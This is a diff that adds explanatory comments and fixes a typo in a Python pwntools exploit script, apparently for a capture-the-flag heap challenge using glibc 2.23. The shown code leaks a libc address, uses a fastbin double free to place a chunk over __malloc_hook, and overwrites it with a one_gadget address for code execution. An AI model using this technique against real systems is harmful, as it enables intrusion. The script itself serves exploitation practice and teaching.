@@ -25,7 +25,7 @@ def rop_chain(chain):
     return reduce(lambda x, y: x + y, chain)
 
 #I/O functions
-#All I/O functions assume they havebeen called from the main menu
+#All I/O functions assume they have been called from the main menu
 # Given a size allocates the entry in heap and returns its index
 def alloc(r, size):
     r.clean()
@@ -89,7 +89,7 @@ LIBC = ELF("./libc-2.23.so")
 small = alloc(r, 0x100)
 pad = alloc(r, 0x20)
 free(r, small)
-libc_leak = u64(read(r, small).ljust(8, b"\x00"))
+libc_leak = u64(read(r, small).ljust(8, b"\x00")) # read libc leak from freed forward pointer. it points in libc's main arena
 LIBC.address = libc_leak - 0x3c4b78
 print("libc_base:", hex(LIBC.address))
 
@@ -100,13 +100,13 @@ free(r, a)
 free(r, b)
 free(r, a)
 a = alloc(r, 0x60)
-write(r, a, p64(LIBC.symbols["__malloc_hook"] - 0x23))
+write(r, a, p64(LIBC.symbols["__malloc_hook"] - 0x23)) # I find the malloc hook
 b = alloc(r, 0x60)
 a = alloc(r, 0x60)
 
 #RCE
-hook = alloc(r, 0x60)
-write(r, hook, b'a'*0x13+p64(LIBC.address+one_gadget))
+hook = alloc(r, 0x60) # this is a chunk on top of the malloc hook
+write(r, hook, b'a'*0x13+p64(LIBC.address+one_gadget)) # 0x10 bytes less for the header, the padding filled with 'a' until I reach the malloc hook qword
 r.clean() #performing another malloc will trigger __malloc_hook and get RCE
 send(r, b"1")
 r.recvuntil(b"Size: ")
